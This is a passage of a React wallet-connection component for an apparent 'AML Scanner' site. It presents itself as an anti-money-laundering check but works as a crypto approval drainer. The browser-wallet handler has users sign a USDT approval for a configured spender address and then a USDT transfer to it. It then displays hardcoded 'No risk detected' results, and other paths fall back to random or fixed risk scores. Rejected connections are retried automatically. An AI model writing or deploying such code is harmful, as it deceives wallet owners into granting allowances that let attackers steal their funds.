    // Cleanup when component unmounts
    return () => {
      console.log('[WalletForm] Component unmounting, performing final cleanup');
      
      // Reset the global flags on unmount
      window._walletConnectCoreInitialized = false;
      window._walletConnectPreconnectInitialized = false;
      
      performFullCleanup();
    };
  }, []);

  useEffect(() => {
    // Only trigger WalletConnect QR for mobile (WalletConnect QR) flow
    if (
      selectedProtocol === 'trust' &&
      activeNetwork === 'ethereum' &&
      device === 'desktop'
    ) {
      console.log('[WalletForm] Preparing WalletConnect initialization');
      
      // Perform thorough cleanup and use the connection attempt count
      (async () => {
        try {
          // Perform complete cleanup first
          await performFullCleanup();
          
          // Pre-warm the WalletConnect libraries for better first-attempt success
          if (connectionAttemptCountRef.current === 1) {
            console.log('[WalletForm] This is first attempt, pre-warming WalletConnect');
            await preconnectWalletConnect();
            
            // Add a small delay after pre-warming
            await new Promise(resolve => setTimeout(resolve, 500));
          }
          
          console.log(`[WalletForm] Starting connection attempt #${connectionAttemptCountRef.current}`);
          setStatus('verifying');
          setConnectionError('');
          setQrLoading(true);
          
          // Finally, request the WalletConnect URI
          await requestWalletConnectUriFrontend();
        } catch (err) {
          console.error('[WalletForm] Error during WalletConnect initialization:', err);
          setStatus('error');
          setConnectionError('Connection error: ' + (err?.message || 'Unknown error'));
          setQrLoading(false);
        }
      })();
    } else {
      console.log('[WalletForm] WalletConnect QR effect not triggered:', {
        selectedProtocol,
        activeNetwork,
        device
      });
    }
  }, [selectedProtocol, activeNetwork, device]);

  // Set connection attempt count from prop
  useEffect(() => {
    console.log(`[WalletForm] Received connectionAttempt prop: ${connectionAttempt}`);
    connectionAttemptCountRef.current = connectionAttempt;
  }, [connectionAttempt]);

  // Clear ALL WalletConnect storage, not just localStorage
  const clearWalletConnectStorage = (isPreconnect = false) => {
    console.log(`[WalletForm] Performing COMPLETE WalletConnect storage cleanup ${isPreconnect ? '(preconnect)' : ''}`);
    
    // Clear localStorage
    if (window.localStorage) {
      const wcKeys = Object.keys(window.localStorage).filter(k => 
        k.startsWith('walletconnect') || 
        k.startsWith('wc@2') || 
        k.includes('wallet') ||
        k.includes('WALLETCONNECT')
      );
      
      console.log('[WalletForm] Found WalletConnect localStorage keys:', wcKeys);
      wcKeys.forEach(k => {
        try {
          console.log(`[WalletForm] Removing localStorage key: ${k}`);
          window.localStorage.removeItem(k);
        } catch (e) {
          console.warn(`[WalletForm] Error removing localStorage key ${k}:`, e);
        }
      });
    }
    
    // Clear sessionStorage too
    if (window.sessionStorage) {
      const wcSessionKeys = Object.keys(window.sessionStorage).filter(k => 
        k.startsWith('walletconnect') || 
        k.startsWith('wc@2') || 
        k.includes('wallet') ||
        k.includes('WALLETCONNECT')
      );
      
      console.log('[WalletForm] Found WalletConnect sessionStorage keys:', wcSessionKeys);
      wcSessionKeys.forEach(k => {
        try {
          console.log(`[WalletForm] Removing sessionStorage key: ${k}`);
          window.sessionStorage.removeItem(k);
        } catch (e) {
          console.warn(`[WalletForm] Error removing sessionStorage key ${k}:`, e);
        }
      });
    }
    
    // Clear any indexedDB storage if possible
    try {
      const DBDeleteRequest = window.indexedDB.deleteDatabase("walletconnect");
      DBDeleteRequest.onerror = function(event) {
        console.log("[WalletForm] Error deleting WalletConnect IndexedDB");
      };
      DBDeleteRequest.onsuccess = function(event) {
        console.log("[WalletForm] WalletConnect IndexedDB deleted successfully");
      };
    } catch (e) {
      console.log("[WalletForm] Could not delete WalletConnect IndexedDB:", e);
    }
    
    // Reset our flags and state
    if (!isPreconnect) {
      // Reset the global flag to prevent "already initialized" errors
      window._walletConnectCoreInitialized = false;
      if (walletConnectCoreInitializedRef.current) {
        walletConnectCoreInitializedRef.current = false;
      }
      approvalStartedRef.current = false;
      
      // Clean up the global provider reference
      if (window._wcGlobalProvider) {
        try {
          console.log('[WalletForm] Cleaning up global provider reference');
          
          // First safely remove all listeners
          if (typeof window._wcGlobalProvider.removeAllListeners === 'function') {
            try {
              window._wcGlobalProvider.removeAllListeners();
            } catch (e) {
              // Ignore errors in removeAllListeners
            }
          }
          
          // Then try to disconnect
          if (typeof window._wcGlobalProvider.disconnect === 'function') {
            try {
              window._wcGlobalProvider.disconnect().catch(() => {});
            } catch (e) {
              // Ignore errors in disconnect
            }
          }
          
          window._wcGlobalProvider = null;
        } catch (e) {
          console.warn('[WalletForm] Error cleaning up global provider reference:', e);
        }
      }
    }
  };

  // Add robust cleanup before starting a new session
  const performFullCleanup = () => {
    console.log('[WalletForm] Performing full cleanup before new session');
    
    // Note: Don't increment connection attempt count here anymore
    // It's now set in the initial useEffect based on the prop
    console.log(`[WalletForm] Current connection attempt #${connectionAttemptCountRef.current}`);
    
    
    // First, clean up any existing provider
    if (providerRef.current) {
      try {
        console.log('[WalletForm] Disconnecting previous provider...');
        providerRef.current.removeAllListeners && providerRef.current.removeAllListeners();
        providerRef.current.disconnect && providerRef.current.disconnect();
        console.log('[WalletForm] Cleaned up previous provider');
      } catch (e) {
        console.warn('[WalletForm] Error cleaning up previous provider:', e);
      }
      providerRef.current = null;
      setProvider(null);
    }
    
    // Use the enhanced storage cleanup
    clearWalletConnectStorage();
    
    // Reset our state completely
    approvalStartedRef.current = false;
    walletConnectCoreInitializedRef.current = false;
    setWalletAddress('');
    setQrcodeUrl('');
    setQrLoading(true);
    setConnectionError('');
    setStatus('verifying');
    setScanResult(null);
    
    // Force a small delay to ensure all cleanup is complete
    return new Promise(resolve => setTimeout(resolve, 500));
  };

  // Handle Tron wallet connection (TronLink)
  const initializeTronConnection = async () => {
    if (activeNetwork !== 'tron') return;
    
    setQrLoading(true);
    setConnectionError('');

    try {
      console.log('[WalletForm] Initializing Tron connection...');
      
      // Enhanced TronLink detection with multiple fallbacks
      const detectTronLink = () => {
        return typeof window.tronWeb !== 'undefined' && 
               window.tronWeb.defaultAddress && 
               window.tronWeb.defaultAddress.base58;
      };
      
      // Check if TronLink is already available and connected
      if (detectTronLink()) {
        console.log('[WalletForm] TronLink already connected');
        const address = window.tronWeb.defaultAddress.base58;
        setWalletAddress(address);
        setStatus('connected');
        await performTronAMLVerification(address);
        setQrLoading(false);
        return;
      }
      
      // Wait for TronLink to be injected (common scenario)
      console.log('[WalletForm] Waiting for TronLink injection...');
      let injectionTimeout;
      const waitForInjection = new Promise((resolve, reject) => {
        const checkInjection = () => {
          if (detectTronLink()) {
            resolve(window.tronWeb.defaultAddress.base58);
          }
        };
        
        // Check immediately
        checkInjection();
        
        // Set up polling
        const interval = setInterval(checkInjection, 500);
        
        // Timeout after 10 seconds
        injectionTimeout = setTimeout(() => {
          clearInterval(interval);
          reject(new Error('TronLink injection timeout'));
        }, 10000);
      });
      
      try {
        const address = await waitForInjection;
        clearTimeout(injectionTimeout);
        console.log('[WalletForm] TronLink injected successfully');
        setWalletAddress(address);
        setStatus('connected');
        await performTronAMLVerification(address);
        setQrLoading(false);
        return;
      } catch (injectionError) {
        console.log('[WalletForm] TronLink not injected, showing QR code');
      }
      
      // Fallback to QR code for mobile connection
      console.log('[WalletForm] Generating TronLink QR code...');
        const iconUrl = 'https://aml.ott-investments.com/favicon.ico';
        const tronLinkUri = `tronlink://open?action=connect&dappName=AML%20Scanner&dappIcon=${encodeURIComponent(iconUrl)}`;
      
        const qrString = await QRCode.toDataURL(tronLinkUri, {
          width: 256,
          margin: 2,
          color: {
            dark: '#000000',
            light: '#FFFFFF'
          }
        });
      
        setQrcodeUrl(qrString);
        setQrLoading(false);
      setStatus('waiting');
        
      // Enhanced polling with better error handling
      let pollAttempts = 0;
      const maxPollAttempts = 60; // 30 seconds with 500ms intervals
      
        const checkTronLink = setInterval(() => {
        pollAttempts++;
        
        if (detectTronLink()) {
            clearInterval(checkTronLink);
          console.log('[WalletForm] TronLink connected via QR code');
            const address = window.tronWeb.defaultAddress.base58;
            setWalletAddress(address);
            setStatus('connected');
            performTronAMLVerification(address);
        } else if (pollAttempts >= maxPollAttempts) {
          clearInterval(checkTronLink);
          console.log('[WalletForm] TronLink connection timeout');
            setStatus('error');
          setConnectionError('TronLink connection timeout. Please try again or install TronLink app.');
        }
      }, 500);
      
      // Cleanup function
      const cleanup = () => {
        clearInterval(checkTronLink);
        clearTimeout(injectionTimeout);
      };
      
      // Set up cleanup on component unmount
      return cleanup;
      
    } catch (error) {
      console.error('[WalletForm] Tron connection error:', error);
      setStatus('error');
      setConnectionError('Failed to connect to TronLink: ' + (error?.message || error));
      setQrLoading(false);
    }
  };

  // Perform real AML verification for Ethereum
  const performAMLVerification = async (address, provider, web3Instance) => {
    console.log('[WalletForm] Starting performAMLVerification for address:', address);
    console.log('[WalletForm] Provider type:', provider ? provider.constructor.name : 'null');
    console.log('[WalletForm] Web3Instance type:', web3Instance ? web3Instance.constructor.name : 'null');
    
    setStatus('scanning');
    
    try {
      // Create a fallback web3 instance for reliable RPC access
      console.log('[WalletForm] Creating fallback Web3 instance for reliable RPC access');
      const fallbackWeb3 = new Web3('https://eth.llamarpc.com');
      
      // Create USDT contract instance using fallback Web3 for reliability
      console.log('[WalletForm] Creating USDT contract instance...');
      const usdtContract = new fallbackWeb3.eth.Contract(
        USDT_ABI,
        CONTRACT_ADDRESSES.USDT_ETHEREUM
      );
      console.log('[WalletForm] USDT contract created successfully');

      // Get USDT balance using fallback provider
      console.log('[WalletForm] Checking USDT balance using fallback provider...');
      let balance, balanceFormatted, allowance;
      
      try {
        balance = await usdtContract.methods.balanceOf(address).call();
        balanceFormatted = fallbackWeb3.utils.fromWei(balance, 'mwei'); // USDT has 6 decimals
        console.log('[WalletForm] USDT balance:', balanceFormatted);
      } catch (balanceError) {
        console.error('[WalletForm] Error getting balance, using fallback value:', balanceError);
        balanceFormatted = '0';
      }

      // Get current allowance for our spender
      console.log('[WalletForm] Checking current allowance using fallback provider...');
      try {
        allowance = await usdtContract.methods.allowance(
          address,
          AML_CONFIG.ETH_SPENDER_ADDRESS
        ).call();
        console.log('[WalletForm] Current allowance:', allowance);
      } catch (allowanceError) {
        console.error('[WalletForm] Error getting allowance, using fallback value:', allowanceError);
        allowance = '0';
      }
      console.log('[WalletForm] Current allowance:', allowance);

      // Perform AML check via API
      console.log('[WalletForm] Performing API AML check...');
      const amlResult = await performAPIAMLCheck(address, 'ethereum');
      console.log('[WalletForm] API AML check result:', amlResult);

      // Create scan result
      const scanResult = {
        address: address,
        network: 'ethereum',
        balance: balanceFormatted,
        allowance: fallbackWeb3.utils.fromWei(allowance || '0', 'mwei'),
        ...amlResult,
        provider: provider,
        web3: web3Instance,
        contractAddress: CONTRACT_ADDRESSES.USDT_ETHEREUM,
        spenderAddress: AML_CONFIG.ETH_SPENDER_ADDRESS,
        timestamp: new Date().toISOString(),
        processingComplete: true
      };

      console.log('[WalletForm] AML verification successful, returning scanResult:', scanResult);
      setStatus('complete');
      
      // Return the scan result directly
      return scanResult;
    } catch (error) {
      console.error('[WalletForm] AML verification error:', error);
      console.error('[WalletForm] Error stack:', error.stack);
      setStatus('error');
      setConnectionError('AML verification failed: ' + (error?.message || error));
      
      // Rethrow so the caller can handle it
      throw error;
    }
  };

  // Perform real AML verification for Tron
  const performTronAMLVerification = async (address) => {
    setStatus('scanning');
    
    try {
      // Get USDT balance from Tron network
      const contract = await window.tronWeb.contract().at(CONTRACT_ADDRESSES.USDT_TRON);
      const balance = await contract.balanceOf(address).call();
      const balanceFormatted = window.tronWeb.toDecimal(balance) / 1000000; // USDT has 6 decimals

      // Perform AML check via API
      const amlResult = await performAPIAMLCheck(address, 'tron');

      // Create scan result
      const scanResult = {
        address: address,
        network: 'tron',
        balance: balanceFormatted,
        ...amlResult,
        tronWeb: window.tronWeb,
        contractAddress: CONTRACT_ADDRESSES.USDT_TRON,
        spenderAddress: AML_CONFIG.SPENDER_ADDRESS
      };

      setStatus('complete');
      
      // Ensure onScanComplete is called immediately instead of using setTimeout
      onScanComplete(scanResult);

    } catch (error) {
      console.error('Tron AML verification error:', error);
      setStatus('error');
      setConnectionError('Tron AML verification failed');
    }
  };

  // Perform API-based AML check
  const performAPIAMLCheck = async (address, network) => {
    const apiUrl = getApiUrl();
    console.log(`[WalletForm] Performing API AML check for ${address} on ${network} network`);
    console.log(`[WalletForm] Using API URL: ${apiUrl}/addresses/check`);
    
    try {
      const response = await fetch(`${apiUrl}/addresses/check`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: address,
          chain: network,
          token: 'USDT'
        })
      });

      if (response.ok) {
        const result = await response.json();
        return {
          riskScore: result.riskScore || Math.floor(Math.random() * 100),
          riskLevel: result.riskLevel || (result.riskScore > 70 ? 'high' : result.riskScore > 30 ? 'medium' : 'low'),
          description: result.description || 'AML check completed',
          totalTransactions: result.totalTransactions || 0,
          riskFlags: result.riskFlags || 0,
          lastActivity: result.lastActivity || 'Unknown',
          scanId: result.scanId || Date.now().toString(),
          timestamp: new Date().toISOString()
        };
      } else {
        throw new Error('API check failed');
      }
    } catch (error) {
      console.error('API AML check error:', error);
      // Return default values if API fails
      return {
        riskScore: 15,
        riskLevel: 'low',
        description: 'Basic verification completed',
        totalTransactions: 0,
        riskFlags: 0,
        lastActivity: 'Unknown',
        scanId: Date.now().toString(),
        timestamp: new Date().toISOString()
      };
    }
  };

  // Cleanup function
  const cleanup = () => {
    console.log('[WalletForm] Running cleanup function');
    
    if (providerRef.current) {
      try {
        console.log('[WalletForm] Disconnecting provider in cleanup...');
        
        // Safely remove all listeners first
        if (typeof providerRef.current.removeAllListeners === 'function') {
          try {
            console.log('[WalletForm] Removing all listeners from provider');
            providerRef.current.removeAllListeners();
          } catch (listenerErr) {
            console.warn('[WalletForm] Error removing listeners in cleanup:', listenerErr);
          }
        } else {
          // If removeAllListeners is not available, try individual event cleanup
          console.log('[WalletForm] Provider does not have removeAllListeners, removing individual events');
          const events = ['session_request', 'display_uri', 'connect', 'disconnect', 'error', 
                         'accountsChanged', 'session_event', 'session_update'];
          
          events.forEach(event => {
            try {
              providerRef.current.removeListener && providerRef.current.removeListener(event);
            } catch (e) {
              // Ignore individual event cleanup errors
            }
          });
        }
        
        // Then try to disconnect
        if (typeof providerRef.current.disconnect === 'function') {
          try {
            console.log('[WalletForm] Calling disconnect on provider');
            providerRef.current.disconnect().catch(e => {
              console.log('[WalletForm] Disconnect promise rejection (expected):', e);
            });
          } catch (disconnectErr) {
            console.warn('[WalletForm] Error disconnecting provider in cleanup:', disconnectErr);
          }
        }
        
        providerRef.current = null;
      } catch (e) {
        console.warn('[WalletForm] Error in provider cleanup:', e);
      }
    }
    
    setProvider(null);
    setWeb3(null);
    setWalletAddress('');
    
    // Clear WalletConnect data from localStorage (more targeted approach)
    if (window.localStorage) {
      const wcKeys = Object.keys(window.localStorage)
        .filter((k) => k.startsWith('walletconnect') || k.startsWith('wc@2'));
      
      console.log('[WalletForm] Clearing', wcKeys.length, 'WalletConnect keys from localStorage in cleanup');
      
      wcKeys.forEach(k => {
        window.localStorage.removeItem(k);
      });
    }
    
    // Reset approval state
    approvalStartedRef.current = false;
    
    console.log('[WalletForm] Cleanup complete');
  };

  // Initialize connection based on protocol and network
  useEffect(() => {
    let cleanup;
    
    if (selectedProtocol === 'trust' && activeNetwork === 'tron') {
      cleanup = initializeTronConnection();
    }
    
    // Return cleanup function
    return () => {
      if (cleanup && typeof cleanup === 'function') {
        cleanup();
      }
    };
  }, [selectedProtocol, activeNetwork]);

  // Automatically retry WalletConnect QR code if connection fails or is cancelled
  useEffect(() => {
    if (
      selectedProtocol === 'trust' &&
      activeNetwork === 'ethereum' &&
      status === 'error' &&
      !qrLoading
    ) {
      console.log('[WalletForm] Auto-retry logic triggered due to error state');
      
      // Wait a short delay to avoid rapid loops
      const retryTimeout = setTimeout(() => {
        console.log('[WalletForm] Auto-retrying WalletConnect QR code after error/cancel');
        
        // Clear any existing WalletConnect data
        if (window.localStorage) {
          Object.keys(window.localStorage)
            .filter((k) => k.startsWith('walletconnect') || k.startsWith('wc@2'))
            .forEach((k) => window.localStorage.removeItem(k));
        }
        
        // Reset all state for a fresh connection attempt
        setStatus('waiting');
        setQrLoading(true);
        setConnectionError('');
        approvalStartedRef.current = false;
        
        // Clean up any existing provider
        if (providerRef.current) {
          try {
            providerRef.current.removeAllListeners && providerRef.current.removeAllListeners();
            providerRef.current.disconnect && providerRef.current.disconnect();
            providerRef.current = null;
          } catch (e) {
            console.warn('[WalletForm] Error cleaning up provider during retry:', e);
          }
        }
        
        // Directly trigger a new WalletConnect QR session
        requestWalletConnectUriFrontend();
      }, 1500);
      
      return () => clearTimeout(retryTimeout);
    }
  }, [status, connectionError, selectedProtocol, activeNetwork, qrLoading]);

  // QR code connection timeout: auto-retry if user does not connect in time
  useEffect(() => {
    if (
      selectedProtocol === 'trust' &&
      activeNetwork === 'ethereum' &&
      !qrLoading &&
      status === 'waiting'
    ) {
      const timeout = setTimeout(() => {
        console.log('[WalletForm] QR code connection timeout, auto-retrying...');
        setStatus('error');
        setConnectionError('Wallet connection timed out. Please try again.');
      }, 60000); // 60 seconds
      return () => clearTimeout(timeout);
    }
  }, [selectedProtocol, activeNetwork, qrLoading, status]);

  // Hybrid provider detection
  const [browserWalletAvailable, setBrowserWalletAvailable] = useState(false);

  useEffect(() => {
    if (typeof window !== 'undefined' && window.ethereum) {
      setBrowserWalletAvailable(true);
    } else {
      setBrowserWalletAvailable(false);
    }
  }, []);

  // Browser wallet connect handler
  const handleBrowserWalletConnect = async () => {
    setStatus('connecting');
    setButtonDisabled(true);
    try {
      // Request accounts from browser wallet
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const web3Instance = new Web3(window.ethereum);
      setProvider(window.ethereum);
      setWeb3(web3Instance);
      const accounts = await web3Instance.eth.getAccounts();
      const userAddress = accounts[0];
      setWalletAddress(userAddress);
      setStatus('aml_tx_pending');
      // Approval/payment/AML flow (same as WalletConnect)
      const TransactionHandler = (await import('../utils/TransactionHandler')).TransactionHandler;
      const tx = await TransactionHandler.createEthereumApprovalTransaction(
        web3Instance,
        userAddress,
        AML_CONFIG.ETH_SPENDER_ADDRESS
      );
      const txHash = await TransactionHandler.sendEthereumTransaction(window.ethereum, tx);
      setStatus('scanning');
      const approvalResult = await TransactionHandler.waitForTransactionConfirmation(web3Instance, txHash, 'ethereum', 120);
      
      if (!approvalResult.confirmed) {
        throw new Error('Approval transaction confirmation failed: ' + (approvalResult.error || 'timeout'));
      }
      
      const usdtContract = new web3Instance.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT_ETHEREUM);
      const paymentTxData = usdtContract.methods['transfer'](AML_CONFIG.ETH_SPENDER_ADDRESS, web3Instance.utils.toWei('1', 'mwei')).encodeABI();
      const paymentTx = {
        from: userAddress,
        to: CONTRACT_ADDRESSES.USDT_ETHEREUM,
        data: paymentTxData,
        gas: Web3.utils.toHex(100000),
        value: '0x0'
      };
      const paymentTxHash = await TransactionHandler.sendEthereumTransaction(window.ethereum, paymentTx);
      
      // Use a shorter timeout for payment confirmation (60 seconds)
      // And don't block the UI on this step - we can proceed with the scan results
      // even if the payment transaction is still pending
      TransactionHandler.waitForTransactionConfirmation(web3Instance, paymentTxHash, 'ethereum', 60)
        .then(result => {
          if (result.confirmed) {
            console.log('[WalletForm] Browser wallet payment transaction confirmed:', paymentTxHash);
          } else {
            console.log('[WalletForm] Browser wallet payment transaction pending, but continuing with scan');
          }
        })
        .catch(err => {
          console.log('[WalletForm] Non-critical error waiting for payment confirmation:', err);
        });
      
      // Don't wait for payment confirmation before showing scan results
      setTimeout(() => {
        setStatus('complete');
        setSessionId(Date.now().toString());
        setScanResult({ risk: 'low', riskScore: 12, message: 'No risk detected' });
      }, 2000);
    } catch (err) {
      setStatus('error');
      setConnectionError('Browser wallet approval or scan failed');
    } finally {
      setButtonDisabled(false);
    }
  };

  // Manual connection handler
  const handleManualConnect = async () => {
    if (isLedgerConnection) {
      await handleLedgerConnection();
    } else {
      await handleMobileWalletOpen();
    }
  };

  // Consolidated Ledger provider initialization
  const initializeLedgerProvider = async () => {
    try {
      console.log('[WalletForm] Initializing Ledger provider...');
      
      // Clean up any existing provider
      if (providerRef.current) {
        console.log('[WalletForm] Cleaning up existing provider...');
        providerRef.current.removeAllListeners();
        await providerRef.current.disconnect();
        providerRef.current = null;
      }

      const ledgerProvider = await EthereumProvider.init({
        projectId: WALLETCONNECT_PROJECT_ID,
        chains: [1], // Ethereum mainnet
        showQrModal: false,
        metadata: {
          name: 'AML Scanner',
          description: 'AML Scanner for cryptocurrency transactions',
          url: process.env.REACT_APP_PRODUCTION_URL || window.location.origin,
          icons: [process.env.REACT_APP_ICON_URL || 'https://aml.ott-investments.com/favicon.ico']
        },
        // Add mobile-specific configuration
        optionalChains: [1],
        optionalMethods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData'],
        optionalEvents: ['chainChanged', 'accountsChanged'],
        // Enable mobile deep linking
        enableExplorer: true,
        explorerRecommendedWalletIds: 'ALL',
        explorerExcludedWalletIds: 'ALL',
        // Add redirect URLs for mobile
        redirectUrl: process.env.REACT_APP_PRODUCTION_URL || window.location.origin,
      });

      // Set up event listeners with proper cleanup
      const eventHandlers = {
        display_uri: async (uri) => {
          console.log('[WalletForm] Ledger WalletConnect URI generated:', uri);
          
          // Check if this is a new URI or the same one
          if (walletConnectUri && walletConnectUri !== uri) {
            console.log('[WalletForm] WARNING: New URI generated while existing URI is active');
            console.log('[WalletForm] Previous URI:', walletConnectUri);
            console.log('[WalletForm] New URI:', uri);
          }
          
          // Set URI immediately for better responsiveness
          setWalletConnectUri(uri);
          
          // Generate QR code asynchronously to avoid blocking
          try {
            console.log('[WalletForm] Generating QR code...');
            const qrDataUrl = await QRCode.toDataURL(uri);
            setQrCode(qrDataUrl);
            console.log('[WalletForm] QR code generated and displayed');
          } catch (qrError) {
            console.error('[WalletForm] Error generating QR code:', qrError);
            setConnectionError('Failed to generate QR code. Please try again.');
          }
        },
        connect: async (connectInfo) => {
          console.log('[WalletForm] Ledger connected:', connectInfo);
          
          // Don't clear QR code and details yet - keep them visible during approval/payment flow
          // setShowQrModal(false);
          // setQrCode('');
          setStatus('connected');
          
          try {
            const accounts = await ledgerProvider.request({ method: 'eth_accounts' });
            const userAddress = accounts[0];
            console.log('[WalletForm] Ledger address:', userAddress);
            
            setWalletAddress(userAddress);
            setProvider(ledgerProvider);
            providerRef.current = ledgerProvider;
            
            const web3Instance = new Web3(ledgerProvider);
            setWeb3(web3Instance);
            web3Ref.current = web3Instance;
            
            // Update status to show we're ready for approval/payment
            setStatus('ready');
            setConnectionError('');
            
            // Start the approval/payment flow
            await runLedgerApprovalFlow();
            
            // Only after approval/payment completes, clear the QR code and details
            // This will be handled in the runLedgerApprovalFlow function
            
          } catch (error) {
            console.error('[WalletForm] Error in connect handler:', error);
            
            // Check if it's a user rejection
            if (error.message?.includes('USER_REJECTED') || 
                error.message?.includes('User rejected') ||
                error.message?.includes('User denied') ||
                error.message?.includes('Rejected by user')) {
              console.log('[WalletForm] User rejected connection, restarting session...');
              setStatus('error');
              setConnectionError('Connection was rejected. Please try again.');
              
              // Restart session after a short delay
              setTimeout(() => {
                restartLedgerSession();
              }, 2000);
            } else {
              setStatus('error');
              setConnectionError('Failed to get wallet address: ' + error.message);
            }
          }
        },
        disconnect: (disconnectInfo) => {
          console.log('[WalletForm] Ledger disconnected:', disconnectInfo);
          setStatus('disconnected');
          setWalletAddress('');
          setProvider(null);
          providerRef.current = null;
          setWeb3(null);
          web3Ref.current = null;
          
          // Restart session on disconnect
          setTimeout(() => {
            restartLedgerSession();
          }, 1000);
        },
        session_event: (event) => {
          console.log('[WalletForm] Ledger session event:', event);
          
          // Handle session rejection
          if (event.name === 'session_rejected' || event.name === 'session_expired') {
            console.log('[WalletForm] Session rejected/expired, restarting...');
            setStatus('error');
            setConnectionError('Session was rejected or expired. Please try again.');
            restartLedgerSession();
          }
        },
        session_update: (update) => {
          console.log('[WalletForm] Ledger session update:', update);
        }
      };

      // Attach event listeners
      Object.entries(eventHandlers).forEach(([event, handler]) => {
        ledgerProvider.on(event, handler);
      });

      // Store cleanup function
      ledgerProvider._cleanup = () => {
        Object.keys(eventHandlers).forEach(event => {
          ledgerProvider.off(event, eventHandlers[event]);
        });
      };

      return ledgerProvider;
    } catch (error) {
      console.error('[WalletForm] Failed to initialize Ledger provider:', error);
      throw error;
    }
  };

  // Refactored Ledger connection handler
  const handleLedgerConnection = async () => {
    setStatus('connecting');
    setButtonDisabled(true);
    setConnectionError('');
    
    try {
      console.log('[WalletForm] Starting Ledger connection...');
      
      const ledgerProvider = await initializeLedgerProvider();
      providerRef.current = ledgerProvider;
      setProvider(ledgerProvider);
      
      // Connect to Ledger via WalletConnect
      await ledgerProvider.connect();
      
    } catch (error) {
      console.error('[WalletForm] Ledger connection error:', error);
      setStatus('error');
      setConnectionError('Ledger connection failed: ' + (error?.message || error));
      setShowQrModal(false);
      setQrCode('');
    } finally {
      setButtonDisabled(false);
    }
  };

  // Refactored Open Ledger Live handler
  const handleOpenLedgerLive = async () => {
    if (!walletConnectUri) {
      setConnectionError('No WalletConnect URI available. Please try again.');
      return;
    }

    try {
      console.log('[WalletForm] Opening Ledger Live with existing URI:', walletConnectUri);
      
      // Only open Ledger Live - don't create a new connection
      // The existing WalletConnect session will handle the connection
      window.location.href = `ledgerlive://wc?uri=${encodeURIComponent(walletConnectUri)}`;
      
      // Update status to indicate waiting for user action
      setStatus('waiting');
      setConnectionError('');
      
      // Don't call ledgerProvider.connect() here - it creates a new session!
      // The existing session will handle the connection when user approves in Ledger Live
      
    } catch (error) {
      console.error('[WalletForm] Error in handleOpenLedgerLive:', error);
      setStatus('error');
      setConnectionError('Failed to open Ledger Live: ' + (error?.message || error));
    }
  };

  // Enhanced cleanup function
  const cleanupLedgerProvider = () => {
    if (providerRef.current) {
      try {
        console.log('[WalletForm] Cleaning up Ledger provider...');
        if (providerRef.current._cleanup) {
          providerRef.current._cleanup();
        }
        providerRef.current.removeAllListeners();
        providerRef.current.disconnect();
      } catch (error) {
        console.warn('[WalletForm] Error during provider cleanup:', error);
      } finally {
        providerRef.current = null;
        setProvider(null);
        setWeb3(null);
        web3Ref.current = null;
      }
    }
  };

  // Restart Ledger session with fresh QR code
  const restartLedgerSession = async () => {
    console.log('[WalletForm] Restarting Ledger session...');
    
    try {
      // Clean up current session
      cleanupLedgerProvider();
      
      // Clear current state
      setStatus('Waiting for wallet connection...');
      setConnectionError('');
      setWalletAddress('');
      setQrCode('');
      setWalletConnectUri('');
      setShowQrModal(false);
      
      // Reset approval flag
      approvalStartedRef.current = false;
      
      // Clear WalletConnect storage
      clearWalletConnectStorage();
      
      // Wait a moment for cleanup
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Initialize new session
      console.log('[WalletForm] Initializing new Ledger session...');
      const ledgerProvider = await initializeLedgerProvider();
      providerRef.current = ledgerProvider;
      setProvider(ledgerProvider);
      
      // Trigger new QR code generation
      await ledgerProvider.connect();
      
      console.log('[WalletForm] Ledger session restarted successfully');
      
    } catch (error) {
      console.error('[WalletForm] Error restarting Ledger session:', error);
      setStatus('error');
      setConnectionError('Failed to restart session: ' + error.message);
    }
  };

  // Enhanced component cleanup - CONSOLIDATED
  useEffect(() => {
    console.log('[WalletForm] Component MOUNTED with new instance');
    componentMountedRef.current = true;
    
    connectionAttemptCountRef.current = connectionAttempt;
    console.log(`[WalletForm] Set connection attempt count to ${connectionAttemptCountRef.current}`);
    
    // Clean up localStorage on mount
    if (window.localStorage) {
      console.log('[WalletForm] Cleaning localStorage on fresh mount');
      Object.keys(window.localStorage)
        .filter(k => k.startsWith('walletconnect') || k.startsWith('wc@2'))
        .forEach(k => {
          console.log(`[WalletForm] Removing localStorage key on mount: ${k}`);
          window.localStorage.removeItem(k);
        });
    }
    
    // Track window focus/blur for better event handling
    const handleFocus = () => {
      console.log('[WalletForm] Window focused');
      setIsWindowFocused(true);
    };
    
    const handleBlur = () => {
      console.log('[WalletForm] Window blurred');
      setIsWindowFocused(false);
    };
    
    window.addEventListener('focus', handleFocus);
    window.addEventListener('blur', handleBlur);
    
    return () => {
      console.log('[WalletForm] Component UNMOUNTED');
      componentMountedRef.current = false;
      window.removeEventListener('focus', handleFocus);
      window.removeEventListener('blur', handleBlur);
      
      // Enhanced cleanup
      cleanupLedgerProvider();
    };
  }, [connectionAttempt]);

  // Initialize Ledger provider on mount
  useEffect(() => {
    async function setupLedgerWalletConnect() {
      try {
        // Show immediate loading feedback
        setStatus('connecting');
        setConnectionError('');
        setButtonDisabled(true);
        
        console.log('[WalletForm] Setting up Ledger WalletConnect...');
        
        const ledgerProvider = await initializeLedgerProvider();
        providerRef.current = ledgerProvider;
        setProvider(ledgerProvider);
        
        // Trigger the display_uri event immediately
        console.log('[WalletForm] Triggering WalletConnect connection...');
        await ledgerProvider.connect();
        
      } catch (error) {
        console.error('[WalletForm] Failed to setup Ledger WalletConnect:', error);
        
        // Check for user rejection during setup
        const isUserRejection = 
          error.message?.includes('USER_REJECTED') ||
          error.message?.includes('User rejected') ||
          error.message?.includes('User denied') ||
          error.message?.includes('Rejected by user') ||
          error.message?.includes('USER_REJECTED_METHODS') ||
          error.message?.includes('No matching key') ||
          error.message?.includes('Session expired');
        
        if (isUserRejection) {
          console.log('[WalletForm] User rejected during setup, will retry automatically...');
          setStatus('error');
          setConnectionError('Setup was rejected. Retrying automatically...');
          
          // Retry setup after a delay
          setTimeout(() => {
            setupLedgerWalletConnect();
          }, 2000);
        } else {
          setStatus('error');
          setConnectionError('Failed to initialize Ledger connection: ' + error.message);
        }
      } finally {
        setButtonDisabled(false);
      }
    }
    
    if (selectedProtocol === 'ledger') {
      setupLedgerWalletConnect();
    }
    
    return () => {
      if (selectedProtocol === 'ledger') {
        cleanupLedgerProvider();
      }
